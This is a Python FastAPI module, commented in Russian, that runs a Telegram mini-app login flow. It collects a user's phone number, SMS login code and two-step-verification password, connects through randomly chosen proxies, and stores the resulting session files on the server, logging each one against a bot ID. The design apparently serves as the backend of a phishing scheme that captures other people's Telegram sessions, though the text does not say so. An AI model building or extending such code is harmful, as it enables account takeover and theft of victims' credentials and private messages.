"""
auth_api.py — REST-эндпоинты для авторизации Telegram-аккаунта из мини-аппа.

Состояния авторизации (FSM):

    NEW            → send_code()        → WAIT_CODE
    WAIT_CODE      → submit_code(ok)    → SUCCESS              (если 2FA не нужен)
    WAIT_CODE      → submit_code(2fa)   → WAIT_PASSWORD
    WAIT_CODE      → submit_code(bad)   → WAIT_CODE   (CodeInvalid, попытки--)
    WAIT_CODE      → submit_code(exp)   → CODE_EXPIRED         (предлагаем resend)
    WAIT_CODE      → resend_code()      → WAIT_CODE
    WAIT_PASSWORD  → submit_password    → SUCCESS / WAIT_PASSWORD (PasswordInvalid)
    *              → timeout (10 мин)  → EXPIRED

Сессии хранятся в SESSIONS_DIR ( ./sessions/+номер.session ).
Состояния — в памяти процесса (для прод-окружения замените на Redis).
"""

from __future__ import annotations

import asyncio
import logging
import os
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, Field

from auth_flow import (
    AuthError,
    AuthKeyRevokedError,
    CodeEmptyError,
    CodeExpiredError,
    CodeInvalidError,
    ConnectionFailedError,
    FloodWaitError,
    PasswordInvalidError,
    PhoneBannedError,
    PhoneInvalidError,
    PhoneUnoccupiedError,
    UnknownAuthError,
    create_client,
    finalize,
    pick_random_proxy_from_file,
    resend_code,
    send_code,
    submit_code,
    submit_password,
)

logger = logging.getLogger(__name__)

from database import record_auth_event, record_bot_session

# ---------------- конфиг ----------------

SESSIONS_DIR = Path(os.getenv("SESSIONS_DIR", "./sessions"))
PROXIES_FILE = Path(os.getenv("PROXIES_FILE", "./proxys.txt"))
SESSION_TTL = int(os.getenv("AUTH_SESSION_TTL", "600"))        # 10 минут на весь флоу
MAX_CODE_ATTEMPTS = int(os.getenv("MAX_CODE_ATTEMPTS", "3"))
MAX_PWD_ATTEMPTS = int(os.getenv("MAX_PWD_ATTEMPTS", "3"))


# ---------------- состояния ----------------

class State:
    NEW = "new"
    WAIT_CODE = "wait_code"
    CHECKING_CODE = "checking_code"          # код отправлен, идёт проверка → фронт крутит loader
    WAIT_PASSWORD = "wait_password"
    CHECKING_PASSWORD = "checking_password"  # пароль отправлен, идёт проверка → loader
    CODE_EXPIRED = "code_expired"
    SUCCESS = "success"
    FAILED = "failed"
    EXPIRED = "expired"


@dataclass
class AuthSession:
    sid: str
    tg_user_id: int
    phone: str
    bot_id: Optional[int] = None
    state: str = State.NEW
    phone_code_hash: Optional[str] = None
    client: object = None            # TelegramClient
    code_attempts: int = 0
    pwd_attempts: int = 0
    error: Optional[str] = None
    flood_wait: int = 0
    session_path: Optional[str] = None
    created_at: float = field(default_factory=time.time)
    updated_at: float = field(default_factory=time.time)
    lock: asyncio.Lock = field(default_factory=asyncio.Lock)

    def touch(self) -> None:
        self.updated_at = time.time()

    def expired(self) -> bool:
        return time.time() - self.updated_at > SESSION_TTL

    def public(self) -> dict:
        return {
            "sid": self.sid,
            "state": self.state,
            "phone": self.phone,
            "code_attempts_left": max(0, MAX_CODE_ATTEMPTS - self.code_attempts),
            "pwd_attempts_left": max(0, MAX_PWD_ATTEMPTS - self.pwd_attempts),
            "error": self.error,
            "flood_wait": self.flood_wait,
            "session_path": self.session_path if self.state == State.SUCCESS else None,
        }


_SESSIONS: dict[str, AuthSession] = {}


# ---------------- helpers ----------------

def _get(sid: str) -> AuthSession:
    s = _SESSIONS.get(sid)
    if not s:
        raise HTTPException(404, "session_not_found")
    if s.expired() and s.state not in (State.SUCCESS, State.FAILED, State.EXPIRED):
        s.state = State.EXPIRED
        s.error = "timeout"
        asyncio.create_task(_safe_disconnect(s))
    return s


async def _safe_disconnect(s: AuthSession) -> None:
    if s.client is not None:
        try:
            await finalize(s.client, s.phone, SESSIONS_DIR)
        except Exception:
            pass
        s.client = None


def _map_error(e: Exception) -> tuple[str, str, int]:
    """→ (state, error_code, http_status). state может быть None — не меняем."""
    if isinstance(e, CodeInvalidError):
        return (State.WAIT_CODE, "code_invalid", 400)
    if isinstance(e, CodeExpiredError):
        return (State.CODE_EXPIRED, "code_expired", 400)
    if isinstance(e, CodeEmptyError):
        return (State.WAIT_CODE, "code_empty", 400)
    if isinstance(e, PasswordInvalidError):
        return (State.WAIT_PASSWORD, "password_invalid", 400)
    if isinstance(e, FloodWaitError):
        return (State.FAILED, "flood_wait", 429)
    if isinstance(e, PhoneInvalidError):
        return (State.FAILED, "phone_invalid", 400)
    if isinstance(e, PhoneBannedError):
        return (State.FAILED, "phone_banned", 400)
    if isinstance(e, PhoneUnoccupiedError):
        return (State.FAILED, "phone_unoccupied", 400)
    if isinstance(e, ConnectionFailedError):
        return (State.FAILED, "connection_failed", 502)
    if isinstance(e, AuthKeyRevokedError):
        return (State.FAILED, "auth_key_revoked", 400)
    if isinstance(e, UnknownAuthError):
        return (State.FAILED, "unknown", 500)
    if isinstance(e, AuthError):
        return (State.FAILED, e.__class__.__name__.lower(), 400)
    return (State.FAILED, "unknown", 500)


# ---------------- pydantic ----------------

class StartReq(BaseModel):
    tg_user_id: int = Field(..., ge=1)
    phone: str = Field(..., min_length=5, max_length=20)
    bot_id: Optional[int] = Field(None, ge=1)

class CodeReq(BaseModel):
    sid: str
    code: str = Field(..., min_length=1, max_length=10)

class PasswordReq(BaseModel):
    sid: str
    password: str = Field(..., min_length=1, max_length=256)

class SidReq(BaseModel):
    sid: str


# ---------------- router ----------------

router = APIRouter(prefix="/auth", tags=["auth"])


@router.post("/send_code")
async def api_send_code(req: StartReq) -> dict:
    """Шаг 1: создаём клиент, отправляем код. Возвращаем sid + state=wait_code."""
    sid = uuid.uuid4().hex
    s = AuthSession(sid=sid, tg_user_id=req.tg_user_id, phone=req.phone.strip(), bot_id=req.bot_id)
    _SESSIONS[sid] = s

    async with s.lock:
        try:
            proxy = pick_random_proxy_from_file(PROXIES_FILE)
            s.client = await create_client(s.phone, proxy=proxy, sessions_dir=SESSIONS_DIR)
            s.phone_code_hash = await send_code(s.client, s.phone)
            s.state = State.WAIT_CODE
            s.touch()
            if s.bot_id:
                try:
                    record_auth_event(s.bot_id, "code_sent")
                except Exception:
                    pass
            return s.public()
        except Exception as e:
            state, code, status = _map_error(e)
            s.state, s.error = state, code
            if isinstance(e, FloodWaitError):
                s.flood_wait = e.seconds
            await _safe_disconnect(s)
            raise HTTPException(status, detail=s.public())


@router.post("/resend_code")
async def api_resend_code(req: SidReq) -> dict:
    """Запросить новый код (после истечения или просто заново)."""
    s = _get(req.sid)
    if s.state not in (State.WAIT_CODE, State.CODE_EXPIRED):
        raise HTTPException(400, detail={"error": "bad_state", **s.public()})

    async with s.lock:
        try:
            s.phone_code_hash = await resend_code(s.client, s.phone)
            s.state = State.WAIT_CODE
            s.code_attempts = 0
            s.error = None
            s.touch()
            return s.public()
        except Exception as e:
            state, code, status = _map_error(e)
            s.state, s.error = state, code
            if isinstance(e, FloodWaitError):
                s.flood_wait = e.seconds
            raise HTTPException(status, detail=s.public())


async def _check_code_task(s: "AuthSession", code: str) -> None:
    """Фоновая проверка кода. Меняет state когда закончит — фронт ловит поллингом."""
    async with s.lock:
        s.code_attempts += 1
        try:
            need_2fa = await submit_code(s.client, s.phone, code, s.phone_code_hash)
        except Exception as e:
            state, code_err, _ = _map_error(e)
            s.error = code_err

            if isinstance(e, CodeInvalidError):
                if s.code_attempts >= MAX_CODE_ATTEMPTS:
                    s.state = State.FAILED
                    s.error = "too_many_code_attempts"
                    await _safe_disconnect(s)
                else:
                    s.state = State.WAIT_CODE   # вернулись к вводу кода
                s.touch()
                return

            s.state = state
            if isinstance(e, FloodWaitError):
                s.flood_wait = e.seconds
            if state == State.FAILED:
                await _safe_disconnect(s)
            s.touch()
            return

        # успех проверки кода
        if need_2fa:
            s.state = State.WAIT_PASSWORD
            s.error = None
            s.touch()
            if s.bot_id:
                try:
                    record_auth_event(s.bot_id, "pwd_requested")
                except Exception:
                    pass
            return

        # без 2FA — финал
        s.session_path = await finalize(s.client, s.phone, SESSIONS_DIR)
        s.client = None
        s.state = State.SUCCESS
        s.error = None
        s.touch()
        if s.bot_id:
            try:
                record_auth_event(s.bot_id, "success")
                record_bot_session(s.bot_id, s.phone, s.session_path)
            except Exception:
                pass
        logger.info("[%s] auth success, session=%s", s.phone, s.session_path)


@router.post("/submit_code")
async def api_submit_code(req: CodeReq) -> dict:
    """Шаг 2: запускаем проверку кода в фоне, сразу отдаём state=checking_code.
    Фронт показывает loader и поллит /auth/status/{sid}."""
    s = _get(req.sid)
    if s.state != State.WAIT_CODE:
        raise HTTPException(400, detail={"error": "bad_state", **s.public()})

    # сразу переключаемся в checking, чтобы дубликаты submit_code не прошли
    s.state = State.CHECKING_CODE
    s.error = None
    s.touch()
    asyncio.create_task(_check_code_task(s, req.code.strip()))
    return s.public()


async def _check_password_task(s: "AuthSession", password: str) -> None:
    """Фоновая проверка 2FA. Состояние меняется по завершении — фронт ловит поллингом."""
    async with s.lock:
        s.pwd_attempts += 1
        try:
            await submit_password(s.client, password)
        except Exception as e:
            state, code_err, _ = _map_error(e)
            s.error = code_err

            if isinstance(e, PasswordInvalidError):
                if s.pwd_attempts >= MAX_PWD_ATTEMPTS:
                    s.state = State.FAILED
                    s.error = "too_many_pwd_attempts"
                    await _safe_disconnect(s)
                else:
                    s.state = State.WAIT_PASSWORD
                s.touch()
                return

            s.state = state
            if isinstance(e, FloodWaitError):
                s.flood_wait = e.seconds
            if state == State.FAILED:
                await _safe_disconnect(s)
            s.touch()
            return

        s.session_path = await finalize(s.client, s.phone, SESSIONS_DIR)
        s.client = None
        s.state = State.SUCCESS
        s.error = None
        s.touch()
        if s.bot_id:
            try:
                record_auth_event(s.bot_id, "success")
                record_bot_session(s.bot_id, s.phone, s.session_path)
            except Exception:
                pass
        logger.info("[%s] auth success (2FA), session=%s", s.phone, s.session_path)


@router.post("/submit_password")
async def api_submit_password(req: PasswordReq) -> dict:
    """Шаг 3: запускаем проверку 2FA в фоне, сразу отдаём state=checking_password."""
    s = _get(req.sid)
    if s.state != State.WAIT_PASSWORD:
        raise HTTPException(400, detail={"error": "bad_state", **s.public()})

    s.state = State.CHECKING_PASSWORD
    s.error = None
    s.touch()
    asyncio.create_task(_check_password_task(s, req.password))
    return s.public()


@router.get("/status/{sid}")
async def api_status(sid: str) -> dict:
    return _get(sid).public()


@router.post("/cancel")
async def api_cancel(req: SidReq) -> dict:
    s = _get(req.sid)
    async with s.lock:
        await _safe_disconnect(s)
        s.state = State.FAILED
        s.error = "cancelled"
        return s.public()


# ---------------- фоновая чистка ----------------

async def _gc_loop() -> None:
    while True:
        await asyncio.sleep(60)
        now = time.time()
        for sid, s in list(_SESSIONS.items()):
            # выкинуть тех, что давно завершились или истекли
            if s.state in (State.SUCCESS, State.FAILED, State.EXPIRED) \
               and now - s.updated_at > 300:
                _SESSIONS.pop(sid, None)
                continue
            if s.expired() and s.state not in (State.SUCCESS, State.FAILED, State.EXPIRED):
                s.state = State.EXPIRED
                s.error = "timeout"
                await _safe_disconnect(s)


def start_gc() -> None:
    """Вызывается на startup приложения."""
    loop = asyncio.get_event_loop()
    loop.create_task(_gc_loop())
